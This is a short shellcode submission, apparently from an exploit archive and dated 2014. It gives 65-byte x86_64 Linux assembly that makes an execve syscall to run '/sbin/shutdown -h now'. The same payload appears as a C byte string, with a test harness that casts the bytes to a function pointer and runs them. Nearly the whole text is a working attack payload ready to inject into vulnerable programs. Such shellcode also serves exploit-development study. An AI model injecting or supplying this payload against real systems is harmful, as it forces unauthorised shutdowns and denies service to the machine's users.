/*
; Title: shutdown -h now x86_64 Shellcode - 65 bytes
; Platform: linux/x86_64
; Date: 2014-06-27
; Author: Osanda Malith Jayathissa (@OsandaMalith)

section .text

global _start

_start:

xor rax, rax
xor rdx, rdx

push rax
push byte 0x77
push word 0x6f6e ; now
mov rbx, rsp

push rax
push word 0x682d ;-h
mov rcx, rsp

push rax
mov r8, 0x2f2f2f6e6962732f ; /sbin/shutdown
mov r10, 0x6e776f6474756873
push r10
push r8
mov rdi, rsp

push rdx
push rbx
push rcx
push rdi
mov rsi, rsp

add rax, 59
syscall

*/

#include <stdio.h>
#include <string.h>

unsigned char code[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
"\x77\x66\x68\x6e\x6f\x48\x89\xe3"
"\x50\x66\x68\x2d\x68\x48\x89\xe1"
"\x50\x49\xb8\x2f\x73\x62\x69\x6e"
"\x2f\x2f\x2f\x49\xba\x73\x68\x75"
"\x74\x64\x6f\x77\x6e\x41\x52\x41"
"\x50\x48\x89\xe7\x52\x53\x51\x57"
"\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
"\x05";

int
main() {

printf("Shellcode Length:  %d\n", (int)strlen(code));
int (*ret)() = (int(*)())code;
ret();

return 0;
}